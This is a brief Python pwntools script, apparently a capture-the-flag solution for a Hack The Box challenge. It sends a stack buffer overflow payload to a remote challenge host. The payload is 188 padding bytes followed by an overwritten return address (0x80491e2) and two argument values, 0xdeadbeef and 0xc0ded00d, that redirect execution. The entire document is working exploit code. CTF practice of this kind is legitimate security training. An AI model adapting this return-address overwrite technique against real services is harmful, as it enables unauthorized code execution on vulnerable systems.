from pwn import *

payload = 'A'*188+p32(0x80491e2)+'AAAA'+p32(0xdeadbeef)+p32(0xc0ded00d)

p = remote('docker.hackthebox.eu', 32476)

print p.recv()
p.sendline(payload)
print p.recv()
print p.recv()
